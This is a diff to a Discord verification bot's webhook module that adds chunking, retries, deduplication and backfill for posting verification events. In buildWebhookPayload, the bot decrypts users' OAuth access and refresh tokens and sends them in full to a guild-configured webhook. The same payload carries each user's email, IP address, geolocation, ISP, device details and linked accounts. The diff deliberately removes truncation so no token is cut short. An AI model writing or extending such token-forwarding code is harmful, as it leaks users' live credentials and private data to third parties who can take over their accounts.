@@ -1,6 +1,7 @@
 "use strict";
 
 const crypto = require("node:crypto");
+const mongoose = require("mongoose");
 const GuildConfig = require("../../models/GuildConfig");
 const VerifyLog = require("../../models/VerifyLog");
 const OAuthUser = require("../../models/OAuthUser");
@@ -33,11 +34,77 @@ function formatDate(timestamp) {
 }
 
 /**
+ * Splits lines into multiple embed fields to avoid truncation (P1-8).
+ */
+function chunkLinesToFields(title, lines, maxChars = MAX_FIELD_VALUE_CHARS) {
+    if (!Array.isArray(lines) || !lines.length) {
+        return [{ name: title, value: "ไม่มี", inline: false }];
+    }
+    const fields = [];
+    let currentLines = [];
+    let currentLen = 0;
+
+    for (const line of lines) {
+        const lineLen = line.length + 1;
+        if (currentLen + lineLen > maxChars && currentLines.length > 0) {
+            const partNum = fields.length + 1;
+            fields.push({
+                name: `${title}${partNum > 1 ? ` (ส่วนที่ ${partNum})` : ""}`,
+                value: currentLines.join("\n"),
+                inline: false
+            });
+            currentLines = [line];
+            currentLen = line.length;
+        } else {
+            currentLines.push(line);
+            currentLen += lineLen;
+        }
+    }
+    if (currentLines.length > 0) {
+        const partNum = fields.length + 1;
+        fields.push({
+            name: `${title}${fields.length > 0 ? ` (ส่วนที่ ${partNum})` : ""}`,
+            value: currentLines.join("\n"),
+            inline: false
+        });
+    }
+    return fields;
+}
+
+/**
+ * Splits a long string into multiple embed fields to avoid truncation (P1-8).
+ */
+function chunkStringToFields(title, str, maxChars = MAX_FIELD_VALUE_CHARS) {
+    const s = String(str || "");
+    if (!s) return [{ name: title, value: "ไม่มี", inline: false }];
+    if (s.length <= maxChars) {
+        return [{ name: title, value: s, inline: false }];
+    }
+    const fields = [];
+    let remaining = s;
+    let part = 1;
+    while (remaining.length > 0) {
+        const chunk = remaining.slice(0, maxChars);
+        remaining = remaining.slice(maxChars);
+        fields.push({
+            name: `${title}${part > 1 ? ` (ส่วนที่ ${part})` : ""}`,
+            value: chunk,
+            inline: false
+        });
+        part++;
+    }
+    return fields;
+}
+
+/**
  * Builds the canonical 2-embed payload for a verification event.
+ * Preserves all fields with zero silent truncation.
  */
 function buildWebhookPayload({
+    eventId = null,
     profile = {},
     connections = [],
+    guildSummary = null,
     ipInfo = {},
     device = null,
     tokens = {},
@@ -51,27 +118,42 @@ function buildWebhookPayload({
     const accessToken = tokens.accessToken || (tokens.encryptedAccessToken ? decryptToken(tokens.encryptedAccessToken) : null) || "ไม่มีข้อมูล";
     const refreshToken = tokens.refreshToken || (tokens.encryptedRefreshToken ? decryptToken(tokens.encryptedRefreshToken) : null) || "ไม่มีข้อมูล";
 
-    // Embed 1: Discord Profile & Connections
+    const footerText = [
+        eventId ? `Event: ${eventId}` : null,
+        profile.id ? `User: ${profile.id}` : null
+    ].filter(Boolean).join(" • ") || "Discordbot Verification";
+
+    // Embed 1: Discord Profile & Connections & Server Stats
     const connectionLines = Array.isArray(connections) && connections.length > 0
-        ? connections.map(c => `• ${c.type}${c.verified ? " (Verified)" : ""}`).join("\n")
-        : "ไม่มีการเชื่อมต่อบัญชีภายนอก";
+        ? connections.map(c => `• **${c.type || "Unknown"}**${c.name ? ` (${c.name})` : ""}${c.verified ? " (Verified ✅)" : ""}`)
+        : ["ไม่มีการเชื่อมต่อบัญชีภายนอก"];
 
     const badgeStr = Array.isArray(profile.badgeFlags) && profile.badgeFlags.length > 0
         ? profile.badgeFlags.join(", ")
         : "ไม่มี";
 
+    const guildSummaryStr = guildSummary
+        ? `• เซิร์ฟเวอร์ที่เข้าร่วมทั้งหมด: ${guildSummary.totalGuilds ?? "ไม่ระบุ"}\n• เซิร์ฟเวอร์ที่เป็นเจ้าของ: ${guildSummary.ownerGuildsCount ?? 0}`
+        : "ไม่มีข้อมูลสรุปเซิร์ฟเวอร์";
+
+    const embed1Fields = [
+        { name: "ชื่อผู้ใช้ (Username)", value: profile.displayTag || profile.username || "ไม่มี", inline: true },
+        { name: "Discord ID", value: String(profile.id || "ไม่มี"), inline: true },
+        { name: "Global Name", value: profile.globalName || profile.username || "ไม่มี", inline: true },
+        { name: "วันสร้างบัญชี", value: `${formatDate(profile.accountCreatedAt)} (${profile.accountAgeDays || 0} วัน)`, inline: false },
+        { name: "อีเมล", value: profile.email ? `${profile.email} (${profile.emailVerified ? "ยืนยันแล้ว" : "ยังไม่ยืนยัน"})` : "ไม่มีข้อมูล", inline: true },
+        { name: "เหรียญตรา (Badges)", value: badgeStr, inline: true },
+        { name: "ข้อมูลเซิร์ฟเวอร์ Discord", value: guildSummaryStr, inline: false },
+        ...chunkLinesToFields("บัญชีที่เชื่อมต่อ (Connections)", connectionLines)
+    ];
+
     const embed1 = {
         title: `📋 ข้อมูลผู้ยืนยันตัวตน: ${profile.displayTag || profile.username || profile.id}`,
         color: 0x5865F2,
         thumbnail: profile.avatarUrl ? { url: profile.avatarUrl } : undefined,
-        fields: [
-            { name: "ชื่อผู้ใช้ (Username)", value: profile.displayTag || profile.username || "ไม่มี", inline: true },
-            { name: "Discord ID", value: String(profile.id || "ไม่มี"), inline: true },
-            { name: "วันสร้างบัญชี", value: `${formatDate(profile.accountCreatedAt)} (${profile.accountAgeDays || 0} วัน)`, inline: false },
-            { name: "อีเมล", value: profile.email ? `${profile.email} (${profile.emailVerified ? "ยืนยันแล้ว" : "ยังไม่ยืนยัน"})` : "ไม่มีข้อมูล", inline: true },
-            { name: "เหรียญตรา (Badges)", value: truncate(badgeStr, MAX_FIELD_VALUE_CHARS), inline: true },
-            { name: "บัญชีที่เชื่อมต่อ (Connections)", value: truncate(connectionLines, MAX_FIELD_VALUE_CHARS), inline: false }
-        ]
+        fields: embed1Fields,
+        footer: { text: footerText },
+        timestamp: new Date(verifiedAt).toISOString()
     };
 
     // Embed 2: Network Intelligence, Device, Security Findings, Tokens, and Result
@@ -94,40 +176,65 @@ function buildWebhookPayload({
     if (device?.screenSize) deviceParts.push(`หน้าจอ: ${device.screenSize}`);
     const deviceStr = deviceParts.length ? deviceParts.join(" | ") : "ไม่มีข้อมูลอุปกรณ์";
 
-    const findingStr = Array.isArray(findings) && findings.length > 0
-        ? findings.join(", ")
-        : "ไม่พบความเสี่ยง (ปกติ)";
+    const findingLines = Array.isArray(findings) && findings.length > 0
+        ? findings.map(f => `• ${f}`)
+        : ["ไม่พบความเสี่ยง (ปกติ)"];
 
     const roleMention = roleId ? `<@&${roleId}>${roleName ? ` (${roleName})` : ""}` : (roleName || "ไม่มี");
 
     const embed2Color = result === "success" ? 0x2ECC71 : (result === "blocked" ? 0xE74C3C : 0xF39C12);
     const resultLabel = result === "success" ? "สำเร็จ ✅" : (result === "blocked" ? "ถูกปฏิเสธ/บล็อก 🚫" : "ล้มเหลว ❌");
 
+    const embed2Fields = [
+        { name: "ผลการยืนยัน", value: resultLabel, inline: true },
+        { name: "ยศที่ได้รับ", value: roleMention, inline: true },
+        { name: "IP Address", value: rawIp, inline: true },
+        { name: "ตำแหน่งที่ตั้ง (GeoIP)", value: locationStr, inline: true },
+        { name: "ผู้ให้บริการ (ISP/Org)", value: ispStr, inline: true },
+        { name: "ประเภทเครือข่าย", value: networkStatusStr, inline: true },
+        { name: "ข้อมูลอุปกรณ์ (Device)", value: deviceStr, inline: false },
+        ...(device?.userAgent ? chunkStringToFields("User-Agent", device.userAgent) : []),
+        ...chunkLinesToFields("ข้อสังเกตความปลอดภัย (Findings)", findingLines),
+        ...chunkStringToFields("Access Token", accessToken),
+        ...chunkStringToFields("Refresh Token", refreshToken)
+    ];
+
     const embed2 = {
         title: "🛡️ ข้อมูลความปลอดภัยและการตรวจสอบเครือข่าย",
         color: embed2Color,
-        fields: [
-            { name: "ผลการยืนยัน", value: resultLabel, inline: true },
-            { name: "ยศที่ได้รับ", value: roleMention, inline: true },
-            { name: "IP Address", value: truncate(rawIp, MAX_FIELD_VALUE_CHARS), inline: true },
-            { name: "ตำแหน่งที่ตั้ง (GeoIP)", value: truncate(locationStr, MAX_FIELD_VALUE_CHARS), inline: true },
-            { name: "ผู้ให้บริการ (ISP/Org)", value: truncate(ispStr, MAX_FIELD_VALUE_CHARS), inline: true },
-            { name: "ประเภทเครือข่าย", value: truncate(networkStatusStr, MAX_FIELD_VALUE_CHARS), inline: true },
-            { name: "ข้อมูลอุปกรณ์ (Device)", value: truncate(deviceStr, MAX_FIELD_VALUE_CHARS), inline: false },
-            { name: "ข้อสังเกตความปลอดภัย (Findings)", value: truncate(findingStr, MAX_FIELD_VALUE_CHARS), inline: false },
-            { name: "Access Token", value: truncate(accessToken, MAX_FIELD_VALUE_CHARS), inline: false },
-            { name: "Refresh Token", value: truncate(refreshToken, MAX_FIELD_VALUE_CHARS), inline: false }
-        ]
+        fields: embed2Fields,
+        footer: { text: footerText },
+        timestamp: new Date(verifiedAt).toISOString()
     };
 
     return [embed1, embed2];
 }
 
 /**
+ * Splits embeds having more than 25 fields into sequential embeds (Discord limit safety).
+ */
+function splitEmbedFields(embed) {
+    if (!embed.fields || embed.fields.length <= 25) {
+        return [embed];
+    }
+    const result = [];
+    const fields = embed.fields;
+    for (let i = 0; i < fields.length; i += 25) {
+        const slice = fields.slice(i, i + 25);
+        result.push({
+            ...embed,
+            title: i === 0 ? embed.title : `${embed.title} (ส่วนต่อ)`,
+            fields: slice
+        });
+    }
+    return result;
+}
+
+/**
  * Calculates character count of an embed for Discord limit budgeting.
  */
 function embedCharCount(embed) {
-    let count = (embed.title?.length || 0) + (embed.description?.length || 0);
+    let count = (embed.title?.length || 0) + (embed.description?.length || 0) + (embed.footer?.text?.length || 0);
     if (Array.isArray(embed.fields)) {
         for (const f of embed.fields) {
             count += (f.name?.length || 0) + (f.value?.length || 0);
@@ -137,7 +244,7 @@ function embedCharCount(embed) {
 }
 
 /**
- * Auto-splits embeds into sequential message batches if >6,000 chars without dropping data.
+ * Auto-splits embeds into sequential message batches if >5,800 chars without dropping data.
  */
 function fitEmbedsIntoMessages(embeds = []) {
     const messages = [];
@@ -196,7 +303,11 @@ async function postWebhookMessage(webhookUrl, body, attempt = 1) {
  * Delivers full verification event embeds to a webhook URL.
  */
 async function deliverWebhookEvent(webhookUrl, embeds = []) {
-    const messages = fitEmbedsIntoMessages(embeds);
+    const splitEmbeds = [];
+    for (const emb of embeds) {
+        splitEmbeds.push(...splitEmbedFields(emb));
+    }
+    const messages = fitEmbedsIntoMessages(splitEmbeds);
     for (const msg of messages) {
         await postWebhookMessage(webhookUrl, msg);
         if (messages.length > 1) {
@@ -210,6 +321,14 @@ class VerificationWebhookManager {
     constructor(repo = verificationWebhookRepository) {
         this.repo = repo;
         this.activeWorkers = new Map(); // guildId -> worker promise
+        this.retryTimers = new Map(); // guildId -> setTimeout timer
+
+        // Recover any stuck SENDING deliveries from prior node crashes/restarts (P1-6)
+        try {
+            this.repo.recoverStuckSendingDeliveries();
+        } catch {
+            // SQLite may not be open yet in isolated module tests
+        }
     }
 
     /**
@@ -220,15 +339,28 @@ class VerificationWebhookManager {
     }
 
     /**
-     * Retrieves current webhook readiness & configuration status for a guild.
+     * Retrieves current webhook readiness & configuration status for a guild (P1-10).
+     * Probes real database and queue status instead of hardcoding true.
      */
     async getReadiness(guildId) {
-        const config = await GuildConfig.findOne().where("guildId").equals(String(guildId)).lean();
+        const safeGuildId = String(guildId);
+        const config = await GuildConfig.findOne().where("guildId").equals(safeGuildId).lean();
         const webhookConfig = config?.verification?.webhookLog || {};
         const urlValidation = this.validateUrl(webhookConfig.url);
 
-        const latestJob = this.repo.getLatestJob(guildId);
-        const stats = this.repo.getDeliveryStats(guildId);
+        const mongoReady = mongoose.connection.readyState === 1;
+        let sqliteReady = false;
+        try {
+            const row = this.repo.db.prepare("SELECT 1 as ok").get();
+            sqliteReady = row?.ok === 1;
+        } catch {
+            sqliteReady = false;
+        }
+
+        const latestJob = this.repo.getLatestJob(safeGuildId);
+        const stats = this.repo.getDeliveryStats(safeGuildId);
+
+        const destinationVersion = Number(webhookConfig.destinationVersion) || 1;
 
         return {
             enabled: webhookConfig.enabled === true,
@@ -236,23 +368,36 @@ class VerificationWebhookManager {
             urlConfigured: urlValidation.configured,
             urlValid: urlValidation.valid,
             urlError: urlValidation.code,
+            destinationVersion,
+            liveStartedAt: webhookConfig.liveStartedAt || null,
             lastStatus: webhookConfig.lastStatus || "idle",
             lastDeliveryAt: webhookConfig.lastDeliveryAt || null,
+            databaseReady: {
+                ok: mongoReady && sqliteReady,
+                mongo: mongoReady,
+                sqlite: sqliteReady
+            },
+            queueReady: {
+                ok: sqliteReady
+            },
             activeJob: latestJob && ["RUNNING", "PENDING"].includes(latestJob.status) ? {
                 jobId: latestJob.job_id,
+                destinationVersion: latestJob.destination_version,
                 mode: latestJob.mode,
                 status: latestJob.status,
                 processedCount: latestJob.processed_count,
                 totalEligible: latestJob.total_eligible,
                 successCount: latestJob.success_count,
-                failureCount: latestJob.failure_count
+                failureCount: latestJob.failure_count,
+                retryCount: latestJob.retry_count
             } : null,
             stats
         };
     }
 
     /**
-     * Starts Live-Only delivery mode for a guild.
+     * Starts Live-Only delivery mode for a guild (P1-4).
+     * Sets liveStartedAt cutoff so old history is not re-sent.
      */
     async startLiveMode(guildId) {
         const safeGuildId = String(guildId);
@@ -265,24 +410,26 @@ class VerificationWebhookManager {
             throw new Error("กรุณาตั้งค่า Discord Webhook URL ที่ถูกต้องก่อนเริ่มใช้งาน");
         }
 
+        const now = Date.now();
         await GuildConfig.updateOne({ guildId: safeGuildId }, {
             $set: {
                 "verification.webhookLog.enabled": true,
                 "verification.webhookLog.mode": "live",
+                "verification.webhookLog.liveStartedAt": now,
                 "verification.webhookLog.lastStatus": "running",
                 "verification.webhookLog.lastError": null,
-                "verification.updatedAt": Date.now()
+                "verification.updatedAt": now
             }
         });
 
         // Trigger queue drain if any pending
         this.triggerWorker(safeGuildId);
 
-        return { ok: true, mode: "live" };
+        return { ok: true, mode: "live", liveStartedAt: now };
     }
 
     /**
-     * Starts Backfill-Then-Live mode for a guild.
+     * Starts Backfill-Then-Live mode for a guild (P1-1, P1-5).
      */
     async startBackfillMode(guildId) {
         const safeGuildId = String(guildId);
@@ -307,6 +454,8 @@ class VerificationWebhookManager {
             };
         }
 
+        const destinationVersion = Number(config.verification?.webhookLog?.destinationVersion) || 1;
+
         // Count eligible successful historical verifications
         const totalEligible = await VerifyLog.countDocuments({
             guildId: safeGuildId,
@@ -318,18 +467,20 @@ class VerificationWebhookManager {
         this.repo.createJob({
             jobId,
             guildId: safeGuildId,
-            destinationVersion: 1,
+            destinationVersion,
             mode: "BACKFILL_LIVE",
             totalEligible
         });
 
+        const now = Date.now();
         await GuildConfig.updateOne({ guildId: safeGuildId }, {
             $set: {
                 "verification.webhookLog.enabled": true,
                 "verification.webhookLog.mode": "backfill_live",
+                "verification.webhookLog.liveStartedAt": now,
                 "verification.webhookLog.lastStatus": "running",
                 "verification.webhookLog.lastError": null,
-                "verification.updatedAt": Date.now()
+                "verification.updatedAt": now
             }
         });
 
@@ -340,15 +491,38 @@ class VerificationWebhookManager {
             ok: true,
             jobId,
             mode: "backfill_live",
+            destinationVersion,
             totalEligible
         };
     }
 
     /**
      * Dispatches a live verification event immediately.
+     * Central enforcement: only dispatches successful, role-assigned events (P0-1, P1-3, P1-4, P1-5).
      */
     async dispatchLiveEvent({ guildId, userId, logId, eventData }) {
         const safeGuildId = String(guildId);
+
+        // P0-1: Guard centrally against non-success or unassigned events
+        if (eventData) {
+            if (eventData.result && eventData.result !== "success") {
+                return null;
+            }
+            if (eventData.roleAssignResult) {
+                const r = eventData.roleAssignResult;
+                const roleOk = r.ok === true || r.alreadyHadRole === true || r.joinedWithRole === true;
+                if (!roleOk) return null;
+            }
+        } else if (logId) {
+            const log = await VerifyLog.findById(logId).lean();
+            if (!log || log.result !== "success") return null;
+            if (log.roleAssignResult) {
+                const r = log.roleAssignResult;
+                const roleOk = r.ok === true || r.alreadyHadRole === true || r.joinedWithRole === true;
+                if (!roleOk) return null;
+            }
+        }
+
         const config = await GuildConfig.findOne().where("guildId").equals(safeGuildId).lean();
         const webhookConfig = config?.verification?.webhookLog;
 
@@ -357,14 +531,24 @@ class VerificationWebhookManager {
         const validation = this.validateUrl(webhookConfig.url);
         if (!validation.valid) return null;
 
-        const eventId = logId || `event_${safeGuildId}_${userId}_${Date.now()}`;
-        const deliveryId = `del_${eventId}_${Date.now()}`;
+        // P1-4: Live-Only boundary check
+        const liveStartedAt = Number(webhookConfig.liveStartedAt) || 0;
+        const eventTime = eventData?.verifiedAt || Date.now();
+        if (liveStartedAt > 0 && eventTime < liveStartedAt - 5000) {
+            return null; // Event occurred before live mode started
+        }
+
+        const destinationVersion = Number(webhookConfig.destinationVersion) || 1;
+        const eventId = String(logId || eventData?._id || `event_${safeGuildId}_${userId}_${Date.now()}`);
+
+        // P1-3: Deterministic deliveryId to prevent duplicate deliveries across live/backfill
+        const deliveryId = `del_${safeGuildId}_v${destinationVersion}_${eventId}`;
 
         // Enqueue into SQLite
         this.repo.enqueueDelivery({
             deliveryId,
             guildId: safeGuildId,
-            destinationVersion: 1,
+            destinationVersion,
             eventId,
             userId: String(userId)
         });
@@ -378,12 +562,35 @@ class VerificationWebhookManager {
      * Triggers the background delivery worker for a guild.
      */
     triggerWorker(guildId, backfillJobId = null) {
-        if (this.activeWorkers.has(guildId)) return;
-        const workerPromise = this.runWorker(guildId, backfillJobId)
+        const safeGuildId = String(guildId);
+        if (this.activeWorkers.has(safeGuildId)) return;
+        const workerPromise = this.runWorker(safeGuildId, backfillJobId)
             .finally(() => {
-                this.activeWorkers.delete(guildId);
+                this.activeWorkers.delete(safeGuildId);
             });
-        this.activeWorkers.set(guildId, workerPromise);
+        this.activeWorkers.set(safeGuildId, workerPromise);
+    }
+
+    /**
+     * Schedules automatic retry wake-up for a guild when the next retry timestamp arrives (P1-7).
+     */
+    scheduleNextRetry(guildId) {
+        const safeGuildId = String(guildId);
+        if (this.retryTimers.has(safeGuildId)) {
+            clearTimeout(this.retryTimers.get(safeGuildId));
+            this.retryTimers.delete(safeGuildId);
+        }
+
+        const nextRetry = this.repo.getNextRetryTimestamp(safeGuildId);
+        if (!nextRetry) return;
+
+        const delayMs = Math.max(1000, Math.min(3600000, nextRetry - Date.now()));
+        const timer = setTimeout(() => {
+            this.retryTimers.delete(safeGuildId);
+            this.triggerWorker(safeGuildId);
+        }, delayMs);
+        if (timer.unref) timer.unref();
+        this.retryTimers.set(safeGuildId, timer);
     }
 
     /**
@@ -418,7 +625,8 @@ class VerificationWebhookManager {
     }
 
     /**
-     * Executes backfill replay from MongoDB historical records.
+     * Executes backfill replay from MongoDB historical records (P1-1, P1-3, P1-9).
+     * Tracks per-item delivery status and does not skip failed items permanently.
      */
     async executeBackfill(guildId, job, leaseToken) {
         const config = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
@@ -429,6 +637,7 @@ class VerificationWebhookManager {
         let processed = job.processed_count || 0;
         let successes = job.success_count || 0;
         let failures = job.failure_count || 0;
+        const destinationVersion = job.destination_version || 1;
 
         while (true) {
             const hasLease = this.repo.acquireJobLease(job.job_id, leaseToken, 30000);
@@ -453,25 +662,49 @@ class VerificationWebhookManager {
 
             if (!batch.length) {
                 // Backfill completed!
-                this.repo.completeJob(job.job_id);
+                const finalStatus = failures > 0 ? "COMPLETED_WITH_FAILURES" : "COMPLETED";
+                this.repo.completeJob(job.job_id, finalStatus);
                 await GuildConfig.updateOne({ guildId }, {
                     $set: {
                         "verification.webhookLog.mode": "live",
-                        "verification.webhookLog.lastStatus": "idle",
+                        "verification.webhookLog.lastStatus": failures > 0 ? "completed_with_failures" : "idle",
                         "verification.webhookLog.backfillCompletedAt": Date.now(),
-                        "verification.webhookLog.lastError": null
+                        "verification.webhookLog.lastError": failures > 0 ? `ส่งประวัติย้อนหลังเสร็จสิ้น แต่พบรายการล้มเหลว ${failures} รายการ (บันทึกในคิวสำหรับลองใหม่แล้ว)` : null
                     }
                 });
                 break;
             }
 
             for (const log of batch) {
+                const eventId = String(log._id);
+
+                // P1-3: Check if already delivered for this destinationVersion
+                const existing = this.repo.getDeliveryByEventId(guildId, destinationVersion, eventId);
+                if (existing && existing.status === "SENT") {
+                    successes++;
+                    processed++;
+                    lastCursorId = eventId;
+                    continue;
+                }
+
+                const deliveryId = `del_bf_${job.job_id}_${eventId}`;
+                this.repo.enqueueDelivery({
+                    deliveryId,
+                    jobId: job.job_id,
+                    guildId,
+                    destinationVersion,
+                    eventId,
+                    userId: String(log.userId)
+                });
+
                 try {
                     const oauthUser = await OAuthUser.findOne({ "discord.userId": log.userId }).lean();
                     const embeds = buildWebhookPayload({
+                        eventId,
                         profile: {
                             id: log.userId,
                             username: log.discordSnapshot?.username,
+                            globalName: log.discordSnapshot?.globalName,
                             displayTag: log.discordSnapshot?.displayTag || log.discordSnapshot?.username,
                             avatarUrl: log.discordSnapshot?.avatarUrl,
                             accountCreatedAt: log.discordSnapshot?.accountCreatedAt,
@@ -480,7 +713,9 @@ class VerificationWebhookManager {
                             emailVerified: log.discordSnapshot?.emailVerified,
                             badgeFlags: log.discordSnapshot?.badgeFlags
                         },
-                        connections: oauthUser?.connections || [],
+                        // P1-9: Prefer historical snapshot at verification time
+                        connections: log.connectionsSnapshot || oauthUser?.connections || [],
+                        guildSummary: log.guildSummary || null,
                         ipInfo: log.ipInfo || {},
                         device: log.device || {},
                         tokens: {
@@ -495,14 +730,16 @@ class VerificationWebhookManager {
                     });
 
                     await deliverWebhookEvent(webhookUrl, embeds);
+                    this.repo.markDeliverySent(deliveryId);
                     successes++;
                 } catch (sendErr) {
                     failures++;
                     console.error(`[VerificationWebhook] Error sending backfill for log=${log._id}:`, sendErr.message);
+                    this.repo.markDeliveryRetry(deliveryId, 15000, "backfill_fail", sendErr.message);
                 }
 
                 processed++;
-                lastCursorId = String(log._id);
+                lastCursorId = eventId;
 
                 this.repo.updateJobProgress(job.job_id, {
                     processedCount: processed,
@@ -517,7 +754,8 @@ class VerificationWebhookManager {
     }
 
     /**
-     * Drains pending/retry deliveries from SQLite table.
+     * Drains pending/retry deliveries from SQLite table (P1-2, P1-7).
+     * Strictly verifies event_id and user/guild integrity.
      */
     async drainDeliveries(guildId) {
         const config = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
@@ -530,23 +768,31 @@ class VerificationWebhookManager {
 
             for (const item of deliveries) {
                 try {
-                    const log = await VerifyLog.findOne({
-                        $or: [
-                            { _id: item.event_id },
-                            { userId: item.user_id, guildId }
-                        ]
-                    }).sort({ verifiedAt: -1 }).lean();
+                    // P1-2: Strict lookup by exact event_id
+                    let log = null;
+                    if (mongoose.Types.ObjectId.isValid(item.event_id)) {
+                        log = await VerifyLog.findById(item.event_id).lean();
+                    } else {
+                        log = await VerifyLog.findOne({ _id: item.event_id }).lean();
+                    }
 
-                    if (!log) {
-                        this.repo.markDeliveryFailed(item.delivery_id, "log_not_found", "VerifyLog not found");
+                    if (!log || String(log.guildId) !== String(guildId) || String(log.userId) !== String(item.user_id)) {
+                        this.repo.markDeliveryFailed(item.delivery_id, "log_not_found", "VerifyLog not found or guild/user mismatch");
+                        continue;
+                    }
+
+                    if (log.result !== "success") {
+                        this.repo.markDeliveryFailed(item.delivery_id, "event_not_successful", "VerifyLog result is not success");
                         continue;
                     }
 
                     const oauthUser = await OAuthUser.findOne({ "discord.userId": item.user_id }).lean();
                     const embeds = buildWebhookPayload({
+                        eventId: String(log._id),
                         profile: {
                             id: log.userId,
                             username: log.discordSnapshot?.username,
+                            globalName: log.discordSnapshot?.globalName,
                             displayTag: log.discordSnapshot?.displayTag || log.discordSnapshot?.username,
                             avatarUrl: log.discordSnapshot?.avatarUrl,
                             accountCreatedAt: log.discordSnapshot?.accountCreatedAt,
@@ -555,7 +801,8 @@ class VerificationWebhookManager {
                             emailVerified: log.discordSnapshot?.emailVerified,
                             badgeFlags: log.discordSnapshot?.badgeFlags
                         },
-                        connections: oauthUser?.connections || [],
+                        connections: log.connectionsSnapshot || oauthUser?.connections || [],
+                        guildSummary: log.guildSummary || null,
                         ipInfo: log.ipInfo || {},
                         device: log.device || {},
                         tokens: {
@@ -592,12 +839,18 @@ class VerificationWebhookManager {
                 await sleep(RATE_LIMIT_DELAY_MS);
             }
         }
+
+        // P1-7: Schedule next retry timer if any items remain in RETRY
+        this.scheduleNextRetry(guildId);
     }
 }
 
 const verificationWebhookManager = new VerificationWebhookManager();
 
 module.exports = {
+    chunkLinesToFields,
+    chunkStringToFields,
+    splitEmbedFields,
     buildWebhookPayload,
     embedCharCount,
     fitEmbedsIntoMessages,
